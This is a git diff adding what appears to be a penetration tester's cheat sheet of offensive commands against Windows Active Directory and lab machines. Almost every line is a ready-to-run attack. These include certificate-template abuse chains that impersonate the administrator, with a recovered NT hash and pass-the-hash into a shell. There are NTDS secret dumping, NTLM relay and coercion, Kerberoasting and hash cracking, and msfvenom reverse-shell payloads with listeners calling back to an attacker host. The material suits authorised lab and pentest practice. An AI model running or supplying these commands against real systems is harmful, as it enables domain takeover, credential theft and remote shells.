@@ -1,0 +1,178 @@
+auth_ldap $IP $USER -p $PASSWORD $DOMAIN [-ldap|-ldaps]
+auth_kerberos -u $USER -p $PASSWORD -i $DCIP -d $DOMAIN
+auth_smb -t $IP -u $USER -p $PASSWORD -d $DOMAIN
+uv run bloodhound.py -u $USER -p $PASSWORD -d $DOMAIN -v --zip -c All -dc $DOMAIN -ns $IP
+bloodyAD --host $IP -d $DOMAIN -u $USER -p $PASSWORD get writable --detail
+certipy find -dc-ip $DCIP -u $USER@$DOMAIN -p $PASSWORD -vulnerable -stdout
+certipy find -k -target $DC -vulnerable -stdout
+# 1. find vulnerable templates
+certipy find -dc-ip $DCIP -u $USER -p $PASSWORD -vulnerable -stdout
+# -> found ESC1 on the RetroClients template; note the template name
+# 2. request a cert impersonating administrator
+certipy req -dc-ip $DCIP -u $USER@$DOMAIN -p $PASSWORD -target 'dc.sequel.htb' -ca 'sequel-DC-CA' -template [UserAuthentication] -upn 'administrator@sequel.htb' -key-size 4096
+# -> got a cert but auth failed (likely wrong SID)
+# 3. find the real Administrator SID
+impacket-lookupsid retro.vl/BANKING$:test123@dc.retro.vl
+# -> S-1-5-21-2983547755-698260136-4283918172-500
+# 4. re-request with the correct -sid
+certipy req -u 'BANKING$@retro.vl' -p test123 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
+# 5. auth with the pfx (on errors try ntpdate -s, or add -ldap-shell to add the user to domain admins)
+certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
+# -> NT hash: 252fac7066d93dd009d4fd2cd0368389
+# 6. pass-the-hash for a shell
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389 administrator@DC.retro.vl
+# add yourself as a CA officer to issue certs manually
+certipy ca -dc-ip $DCIP -u $USER -p $PASSWORD -ca $CA -add-officer $USER
+# enable the SubCA template
+certipy ca -dc-ip $DCIP -u $USER -p $PASSWORD -ca $CA -enable-template subca
+# check the enabled templates
+certipy ca -dc-ip $DCIP -u $USER -p $PASSWORD -ca $CA -list-templates
+# request fails but returns a key; note the Request ID (press y to save .pfx)
+certipy req -u $USER -p $PASSWORD -ca $CA -target $DCIP -template SubCA -upn administrator@$DOMAIN
+# issue the pending request as an officer
+certipy ca -u $USER -p $PASSWORD -ca $CA -target $DCIP -issue-request $REQUESTID
+# retrieve the issued cert
+certipy req -u $USER -p $PASSWORD -ca $CA -target $DCIP -retrieve $REQUESTID
+# auth with the pfx
+certipy auth -pfx administrator.pfx -dc-ip $DCIP -domain $DOMAIN
+# change the target account's UPN to Administrator
+certipy account update -dc-ip $DCIP -u $USER -hashes $HASH -user $TARGET_USER -upn Administrator
+# request a cert as the target (UPN now = Administrator)
+certipy req -dc-ip $DCIP -u $TARGET_USER@$DOMAIN -hashes $TARGET_HASH -target $DC -ca $CA -template $TEMPLATE -upn administrator@$DOMAIN
+# set the UPN back so it doesn't conflict with the real Administrator
+certipy account update -dc-ip $DCIP -u $USER -hashes $HASH -user $TARGET_USER -upn $TARGET_USER@$DOMAIN
+# auth using the pfx
+certipy auth -dc-ip $DCIP -pfx administrator.pfx -domain $DOMAIN
+# shadow credentials: add a KeyCredentialLink on the target and recover its hash
+certipy shadow auto -dc-ip $DCIP -u $USER -hashes $HASH -account $TARGET_USER
+# authenticate with a pfx to recover the NT hash / get a TGT
+certipy auth -dc-ip $DCIP -pfx administrator.pfx
+# if that fails, drop into an LDAP shell instead
+certipy auth -dc-ip $DCIP -pfx administrator.pfx -ldap-shell
+credspray.sh -t $IP -u findings.txt -c findings.txt
+uv run dementor.py -u $USER -p $PASSWORD -d $DOMAIN $LHOST $IP
+evil-winrm -i $IP -u $USER -p $PASSWORD
+evil-winrm -i $IP -u $USER -H $HASH
+evil-winrm -i $IP -u $USER -k
+evil-winrm -i $IP -c pub.pem -k priv.pem -S -r $DOMAIN
+ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 300 -fs 3142
+uv run FindUncommonShares.py --dc-ip $IP -u '$USER' -d '$DOMAIN' -p '$PASSWORD'
+uv run gettgtpkinit.py $DOMAIN/$DC -cert-pfx crt.pfx -pfx-pass $PASSWORD out.ccache
+uv run gtfobinsuid.py
+hashcat -m 1000 hashes.ntlm2 /usr/share/wordlists/rockyou.txt --username
+hashcat -m 5600 hashes.ntlm2 /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
+hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
+hashcat -m 0 hashes.md5 /usr/share/wordlists/rockyou.txt
+hashcat -m 100 hashes.sha1 /usr/share/wordlists/rockyou.txt -O
+hashcat -m 13400 database.kdbx /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+hashcat -m 5400 presharedkey.psk /usr/share/wordlists/rockyou.txt
+hashcat -m 1600 hashes.htpasswd /usr/share/wordlists/rockyou.txt -O
+impacket-addcomputer -dc-ip $IP -method LDAPS -computer-pass $NEWPASSWORD -computer-name EVILPC $DOMAIN/$USER:$PASSWORD
+impacket-addcomputer -dc-ip $IP -method SAMR -computer-pass $NEWPASSWORD -computer-name EVILPC $DOMAIN/$USER:$PASSWORD
+impacket-atexec $DOMAIN/$USER:$PASSWORD@$IP whoami
+impacket-atexec -hashes :$HASH $DOMAIN/$USER@$IP whoami
+impacket-changepasswd -protocol kpasswd '$DOMAIN/$USER:$PASSWORD'@$DCIP -newpass $NEWPASSWORD
+impacket-changepasswd -protocol smb '$DOMAIN/$USER:$PASSWORD'@$DCIP -newpass $NEWPASSWORD
+net rpc password '$USER' '$NEWPASSWORD' -U '$DOMAIN/$USER%$PASSWORD' -S $DCIP
+impacket-dcomexec -object MMC20 $DOMAIN/$USER:$PASSWORD@$IP
+impacket-Get-GPPPassword -dc-ip $IP '$DOMAIN/$USER:$PASSWORD@$DC.$DOMAIN'
+impacket-GetADUsers -dc-ip $IP -all $DOMAIN/$USER:$PASSWORD
+impacket-GetNPUsers -dc-ip $IP $DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashes.asrep
+impacket-getPac -targetUser $TARGET_USER $DOMAIN/$USER:$PASSWORD
+impacket-getST -dc-ip $IP -spn $SPN -impersonate administrator $DOMAIN/$USER:$PASSWORD
+impacket-getST -dc-ip $IP -spn $SPN -impersonate administrator $DOMAIN/$USER -hashes :$HASH
+# mint a service ticket from an existing TGT ccache (you already hold a TGT)
+getST.py --ccache tgt.ccache --kirbi cifs.kirbi -spn cifs/$DC
+# fallback via the minikerberos copy if the above misbehaves
+python3 /usr/lib/python3/dist-packages/minikerberos/examples/getST.py --ccache tgt.ccache --kirbi cifs.kirbi -spn cifs/$DC
+impacket-getTGT -dc-ip $DCIP $DOMAIN/$USER:$PASSWORD
+impacket-getTGT -dc-ip $DCIP $DOMAIN/$USER -hashes :$HASH
+impacket-GetUserSPNs -dc-ip $IP $DOMAIN/$USER:$PASSWORD
+impacket-lookupsid $DOMAIN/$USER:$PASSWORD@$IP
+impacket-mssqlclient $USER:$PASSWORD@$IP -windows-auth
+impacket-ntlmrelayx -smb2support -t smb://$IP -c 'whoami /all' -debug
+impacket-ntlmrelayx -smb2support -t smb://$IP -socks
+impacket-ntlmrelayx -t ldaps://$DC.$DOMAIN -wh wpad --delegate-access
+impacket-psexec $DOMAIN/$USER:$PASSWORD@$IP
+impacket-psexec -hashes :$HASH $DOMAIN/$USER@$IP
+impacket-psexec -k -no-pass $DOMAIN/$USER@$IP
+paste users.txt hashes.txt | while IFS=$'\t' read -r user hash; do
+  impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:$hash $DOMAIN/"$user"@$IP
+done
+impacket-rbcd -dc-ip $IP -action write -delegate-to "$DC$" -delegate-from "EVILPC$" -hashes :$HASH $DOMAIN/$USER
+impacket-rpcdump $DOMAIN/$USER:$PASSWORD@$IP
+impacket-samrdump $DOMAIN/$USER:$PASSWORD@$IP
+impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$IP
+impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$HASH
+impacket-secretsdump -dc-ip $IP -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system $DOMAIN/$USER:$PASSWORD@$IP
+impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$HASH -use-vss
+impacket-services $DOMAIN/$USER:$PASSWORD@$IP list
+impacket-smbexec -hashes :$HASH $DOMAIN/$USER@$IP
+impacket-smbexec -k -no-pass $DOMAIN/$USER@$IP
+impacket-ticketConverter ticket.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+impacket-ticketer -dc-ip $DCIP -nthash $HASH -domain-sid $SID -domain $DOMAIN -user-id $UID -groups '$GROUPS' $USER
+impacket-ticketer -dc-ip $DCIP -nthash $HASH -domain-sid $SID -domain $DOMAIN -spn $SPN $USER
+impacket-wmiexec $DOMAIN/$USER:$PASSWORD@$IP
+impacket-wmiexec -hashes :$HASH $DOMAIN/$USER@$IP
+impacket-wmiexec -k -no-pass $DOMAIN/$USER@$IP
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.bcrypt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.md5 --format=md5crypt-long
+ldapsearch -h $DOMAIN -D '$USER@$DOMAIN' -w $PASSWORD -b 'dc=$DOMAIN,dc=local'
+ldapsearch -H ldap://$IP -LLL -x -b'' -s base '(objectclass=*)'
+./LinEnum-ng.sh
+lsassy -u $USER -p $PASSWORD -d $DOMAIN $IP
+mitm6 -d $DOMAIN --ignore-nofqnd
+msfdb run
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
+msfconsole -x 'use exploit/multi/handler;set payload linux/x64/shell_reverse_tcp;set LHOST $LHOST;set LPORT $LPORT;run;'
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o reverse.exe
+msfconsole -x 'use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set LHOST $LHOST;set LPORT $LPORT;run;'
+msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > reverse.php
+msfconsole -x 'use exploit/multi/handler;set payload php/reverse_php;set LHOST $LHOST;set LPORT $LPORT;run;'
+mysql -h $IP -P 3306 -u root -p"" --skip-ssl
+uv run nagoyaspray.py --seasons --months --start 2020 --end 2025 -s "!" -o passwords.txt
+nmap -Pn -sCV -p- $IP -vv -oN nmap_full -T4 --min-rate 2000 --max-retries 20 --open
+nmap -Pn -sC -sU -p 69,123,161,162,500,4500 $IP --open -vv
+noauth_dns $IP $DOMAIN [subdomains.txt]
+noauth_kerberos -t $DCIP -d $DOMAIN
+noauth_smb $IP
+noauth_ldap $IP $DOMAIN [ldap|ldaps]
+nuclei -target http://$IP -fr
+nuclei -target http://$IP -fr --headless
+nxc smb $IP -u '$USER' -p '$PASSWORD' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
+nxc smb $IP -u 'a' -p ''
+nxc smb $IP -u '$USER' -p '$PASSWORD' -X 'whoami'
+nxc smb $IP -u $USER -p $PASSWORD -M coerce_plus
+nxc smb $IP -M timeroast
+nxc smb smb_hosts.txt --gen-relay-list relay_targets.txt
+nxc ldap $IP -u '$USER' -p '$PASSWORD' --trusted-for-delegation --password-not-required --admin-count --users --groups
+nxc ldap $IP -u users.txt -p '' --asreproast hashes.asrep
+nxc ldap $IP -u '$USER' -p '$PASSWORD' --kerberoasting hashes.kerberoast
+nxc winrm $IP -u usernames.txt -p $PASSWORD -d $DOMAIN --local-auth
+nxc winrm $IP -u $USER -H $HASH
+uv run PetitPotam.py -d $DOMAIN -u $USER -p $PASSWORD $LHOST $IP
+pfx2john administrator.pfx > pfx.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
+openssl pkcs12 -in cert.pfx -out pub.pem -clcerts -nokeys
+openssl pkcs12 -in cert.pfx -out priv.pem -nocerts -nodes
+uv run ldapmonitor.py --dc-ip $IP -u '$USER' -d '$DOMAIN' -p '$PASSWORD'
+uv run pywhisker.py --dc-ip "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --target "$TARGET_USER" --action "list"
+redis-cli -h $IP --user $USER -a $PASSWORD
+Responder -I eth0 -A
+rpcclient -U '' -N $IP
+rusthound-ce -d $DOMAIN -u $USER@$DOMAIN -p $PASSWORD -z
+scp nc.exe $USER@$IP:"C:\\users\\$USER"
+smbclient \\\\$IP\\IT -U $USER%$PASSWORD
+smbclient \\\\$IP\\IT -U $USER --pw-nt-hash $HASH
+impacket-smbclient $DOMAIN/$USER:$PASSWORD@$IP
+impacket-smbclient -k -no-pass $DOMAIN/$USER@$IP
+snmpbulkwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects
+ssh -L 1234:127.0.0.1:1234 $USER@$IP
+ssh -K $USER@$IP
+./username-anarchy --input-file ./test-names.txt --select.format first.last
+wfuzz -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 315
+wpscan --url http://$IP --enumerate ap,u,t
+xfreerdp3 /v:$IP /u:$USER /p:$PASSWORD /dynamic-resolution /cert:ignore
+xfreerdp3 /v:$IP /u:$USER /pth:$HASH /dynamic-resolution /cert:ignore /sec:tls /d:$DOMAIN
